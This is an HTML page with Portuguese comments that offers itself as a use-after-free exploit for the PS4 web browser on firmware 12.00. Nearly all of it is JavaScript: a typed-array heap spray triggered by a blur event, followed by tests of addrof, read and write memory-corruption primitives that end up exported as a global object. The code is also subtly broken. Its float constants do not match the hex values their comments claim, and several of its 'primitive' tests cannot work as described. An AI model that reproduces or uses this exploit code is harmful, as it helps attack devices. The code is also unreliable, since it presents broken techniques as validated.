<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Sanitized</title>
</head>
<body>
    <h1>PS4 UAF - Sanitized Tests (Zero False Positives)</h1>
    <h2>FW 12.00 - Validated and Verified</h2>
    
    <button onclick="selfCheck()">AUTO-DIAGNOSTICO (Execute Primeiro)</button>
    <br><br>
    <button onclick="runSanitized()">EXPLOIT SANITIZADO</button>
    <br><br>
    <button onclick="clearLog()">LIMPAR</button>
    
    <hr>
    <div id="log"></div>
    
    <script>
        // Literais float (timing otimo)
        const P_A = 2.121995791e-314; // 0x4141414141414141
        const P_B = 2.122007583e-314; // 0x4242424242424242
        const M_V = 3.395193267e-313; // 0xDEADBEEFCAFEBABE
        const W_V = 1.6045690773137395e-297; // 0x1337133713371337
        
        let targetObj = { leak: 0x1337, type: "target" };
        let globalCtrl = null;
        let globalSpray = null;
        let globalCorrupted = null;
        
        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        function log(msg, color) {
            const d = document.getElementById('log');
            const t = new Date().toLocaleTimeString();
            d.innerHTML += '<div style="color:' + (color || 'black') + '">[' + t + '] ' + msg + '</div>';
            d.scrollTop = d.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        // AUTO-DIAGNOSTICO (Execute ANTES do exploit)
        function selfCheck() {
            clearLog();
            log('==========================================', 'blue');
            log('AUTO-DIAGNOSTICO - Validacao de Conversoes', 'blue');
            log('==========================================', 'blue');
            log('', '');
            
            let failures = 0;
            
            // Test 1: Conversao f2h
            log('[CHECK1] Testando conversao f2h()...', 'blue');
            
            const tests = [
                { name: 'P_A', val: P_A, exp: '0x4141414141414141' },
                { name: 'P_B', val: P_B, exp: '0x4242424242424242' },
                { name: 'M_V', val: M_V, exp: '0xdeadbeefcafebabe' },
                { name: 'W_V', val: W_V, exp: '0x1337133713371337' }
            ];
            
            for(let t of tests) {
                const got = f2h(t.val).toLowerCase();
                const exp = t.exp.toLowerCase();
                
                if(got === exp) {
                    log('  ' + t.name + ': ' + got + ' (OK)', 'green');
                } else {
                    log('  ' + t.name + ': esperado ' + exp + ', obtido ' + got + ' (FAIL)', 'red');
                    failures++;
                }
            }
            log('', '');
            
            // Test 2: Float64Array basico
            log('[CHECK2] Testando Float64Array...', 'blue');
            const arr = new Float64Array(3);
            arr[0] = P_A;
            arr[1] = M_V;
            arr[2] = W_V;
            
            const checks = [
                { idx: 0, exp: '0x4141414141414141' },
                { idx: 1, exp: '0xdeadbeefcafebabe' },
                { idx: 2, exp: '0x1337133713371337' }
            ];
            
            for(let c of checks) {
                const got = f2h(arr[c.idx]).toLowerCase();
                const exp = c.exp.toLowerCase();
                
                if(got === exp) {
                    log('  arr[' + c.idx + ']: ' + got + ' (OK)', 'green');
                } else {
                    log('  arr[' + c.idx + ']: esperado ' + exp + ', obtido ' + got + ' (FAIL)', 'red');
                    failures++;
                }
            }
            log('', '');
            
            // Test 3: Fill
            log('[CHECK3] Testando .fill()...', 'blue');
            const fillTest = new Float64Array(3);
            fillTest.fill(P_A);
            
            let fillOk = true;
            for(let i = 0; i < 3; i++) {
                const got = f2h(fillTest[i]).toLowerCase();
                if(got !== '0x4141414141414141') {
                    log('  fillTest[' + i + ']: ' + got + ' (FAIL)', 'red');
                    fillOk = false;
                    failures++;
                }
            }
            
            if(fillOk) {
                log('  .fill(P_A): OK', 'green');
            }
            log('', '');
            
            // Resultado final
            if(failures === 0) {
                log('==========================================', 'green');
                log('SISTEMA OK - Pode executar o exploit!', 'green');
                log('==========================================', 'green');
            } else {
                log('==========================================', 'red');
                log('FALHAS: ' + failures + ' - NAO execute o exploit!', 'red');
                log('==========================================', 'red');
            }
            log('', '');
        }
        
        // EXPLOIT SANITIZADO (ordem correta, zero falsos positivos)
        function runSanitized() {
            clearLog();
            log('==========================================', 'green');
            log('PS4 UAF - SANITIZED EXPLOIT v5.0', 'green');
            log('==========================================', 'green');
            log('', '');
            
            log('[INIT] Criando 5000 controllers...', 'blue');
            globalCtrl = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i;
                globalCtrl.push(a);
            }
            
            log('[INIT] Controllers criados', 'green');
            log('[WAIT] APERTE OPTIONS DO CONTROLE!', 'red');
            log('', '');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                // Spray atomico
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s.fill(P_A);
                    globalSpray.push(s);
                }
                
                // Busca
                globalCorrupted = null;
                let idx = -1;
                
                for(let i = 0; i < globalCtrl.length; i++) {
                    if(globalCtrl[i][0] === P_A) {
                        globalCorrupted = globalCtrl[i];
                        idx = i;
                        break;
                    }
                }
                
                if(!globalCorrupted) {
                    log('[UAF] NAO DETECTADO', 'red');
                    return;
                }
                
                log('[UAF] DETECTADO! Index: ' + idx, 'green');
                log('', '');
                
                // ==========================================
                // ORDEM CRITICA: addrof PRIMEIRO (memoria limpa)
                // ==========================================
                
                log('==========================================', 'purple');
                log('TESTES SANITIZADOS (Ordem Correta)', 'purple');
                log('==========================================', 'purple');
                log('', '');
                
                // TEST 1: addrof (PRIMEIRO - antes de sujar memoria)
                log('[TEST1] ADDROF PRIMITIVE (memoria limpa)', 'blue');
                try {
                    let leaker = Array.from(globalCorrupted);
                    leaker[0] = targetObj;
                    let addr = f2h(globalCorrupted[0]);
                    
                    log('  Target: ' + JSON.stringify(targetObj), 'cyan');
                    log('  Address: ' + addr, 'cyan');
                    
                    // Validacao: endereco real nao pode ser zero ou padrao
                    if(addr === '0x0000000000000000') {
                        log('[TEST1] FAIL - Endereco zerado', 'red');
                    } else if(addr === f2h(P_A)) {
                        log('[TEST1] FAIL - Ainda com padrao P_A', 'red');
                    } else {
                        log('[TEST1] PASS - Endereco valido capturado', 'green');
                    }
                } catch(e) {
                    log('[TEST1] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 2: Read Primitive
                log('[TEST2] READ PRIMITIVE', 'blue');
                log('  Conteudo inicial (deve ser P_A):', 'cyan');
                let readOk = true;
                for(let i = 0; i < 8; i++) {
                    const val = f2h(globalCorrupted[i]);
                    log('    [' + i + '] = ' + val, 'cyan');
                    
                    // Validacao: Deve ser P_A ou zero (corrompido)
                    if(val !== f2h(P_A) && val !== '0x0000000000000000') {
                        log('    ^ Valor inesperado!', 'orange');
                        readOk = false;
                    }
                }
                
                if(readOk) {
                    log('[TEST2] PASS - Read funcional', 'green');
                } else {
                    log('[TEST2] PARTIAL - Valores inesperados encontrados', 'orange');
                }
                log('', '');
                
                // TEST 3: Write Primitive (com validacao REAL)
                log('[TEST3] WRITE PRIMITIVE', 'blue');
                
                const oldVal = f2h(globalCorrupted[4]);
                log('  Antes: ' + oldVal, 'cyan');
                
                globalCorrupted[4] = M_V;
                const newVal = f2h(globalCorrupted[4]);
                log('  Esperado: ' + f2h(M_V), 'cyan');
                log('  Obtido: ' + newVal, 'cyan');
                
                if(newVal.toLowerCase() === f2h(M_V).toLowerCase()) {
                    log('[TEST3] PASS - Write confirmado', 'green');
                } else {
                    log('[TEST3] FAIL - Valor nao foi escrito corretamente', 'red');
                }
                log('', '');
                
                // TEST 4: Identity (Bidirectional com validacao)
                log('[TEST4] IDENTITY (Bidirectional)', 'blue');
                
                let foundSpray = false;
                let sprayIdx = -1;
                
                for(let i = 0; i < globalSpray.length; i++) {
                    if(globalSpray[i][4] === M_V) {
                        foundSpray = true;
                        sprayIdx = i;
                        log('  Forward: corr[4] -> spray[' + i + '][4] (OK)', 'cyan');
                        
                        // Teste reverso
                        globalSpray[i][5] = W_V;
                        const reverseVal = f2h(globalCorrupted[5]);
                        
                        log('  Escrevendo W_V em spray[' + i + '][5]...', 'cyan');
                        log('  Esperado em corr[5]: ' + f2h(W_V), 'cyan');
                        log('  Obtido em corr[5]: ' + reverseVal, 'cyan');
                        
                        if(reverseVal.toLowerCase() === f2h(W_V).toLowerCase()) {
                            log('[TEST4] PASS - Bidirecional confirmado', 'green');
                        } else {
                            log('[TEST4] PARTIAL - Apenas unidirecional', 'orange');
                        }
                        break;
                    }
                }
                
                if(!foundSpray) {
                    log('[TEST4] FAIL - M_V nao encontrado no spray', 'red');
                }
                log('', '');
                
                // TEST 5: DataView Raw Access
                log('[TEST5] DATAVIEW RAW ACCESS', 'blue');
                try {
                    const dv = new DataView(globalCorrupted.buffer);
                    const before = f2h(globalCorrupted[0]);
                    
                    dv.setUint32(0, 0xDEADBEEF, true);
                    dv.setUint32(4, 0xCAFEBABE, true);
                    
                    const after = f2h(globalCorrupted[0]);
                    
                    log('  Antes: ' + before, 'cyan');
                    log('  Esperado: 0xcafebabedeadbeef', 'cyan');
                    log('  Obtido: ' + after, 'cyan');
                    
                    if(after.toLowerCase() === '0xcafebabedeadbeef') {
                        log('[TEST5] PASS - DataView escrita exata', 'green');
                    } else if(before !== after) {
                        log('[TEST5] PARTIAL - Houve mudanca mas nao exata', 'orange');
                    } else {
                        log('[TEST5] FAIL - Sem mudanca', 'red');
                    }
                } catch(e) {
                    log('[TEST5] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 6: Prototype Pollution
                log('[TEST6] PROTOTYPE POLLUTION', 'blue');
                try {
                    let reg = Array.from(globalCorrupted);
                    Object.setPrototypeOf(reg, { pwned: 0xDEADC0DE });
                    
                    if(reg.pwned === 0xDEADC0DE) {
                        log('  Token injetado: 0x' + reg.pwned.toString(16).toUpperCase(), 'cyan');
                        log('[TEST6] PASS', 'green');
                    } else {
                        log('[TEST6] FAIL - Token nao acessivel', 'red');
                    }
                } catch(e) {
                    log('[TEST6] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 7: Closure Leak
                log('[TEST7] CLOSURE LEAK', 'blue');
                try {
                    const leaked = [0].map(() => globalCorrupted[0])[0];
                    log('  Valor vazado: ' + f2h(leaked), 'cyan');
                    log('[TEST7] PASS', 'green');
                } catch(e) {
                    log('[TEST7] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // Export
                window.uafObject = {
                    corrupted: globalCorrupted,
                    spray: globalSpray,
                    index: idx,
                    read: (i) => f2h(globalCorrupted[i]),
                    write: (i, val) => {
                        globalCorrupted[i] = val;
                        return f2h(globalCorrupted[i]);
                    },
                    addrof: (obj) => {
                        try {
                            let l = Array.from(globalCorrupted);
                            l[0] = obj;
                            return f2h(globalCorrupted[0]);
                        } catch(e) {
                            return 'Error: ' + e.message;
                        }
                    }
                };
                
                log('==========================================', 'green');
                log('EXPLOIT COMPLETO - window.uafObject exportado', 'green');
                log('==========================================', 'green');
                log('', '');
            };
        }
    </script>
</body>
</html>
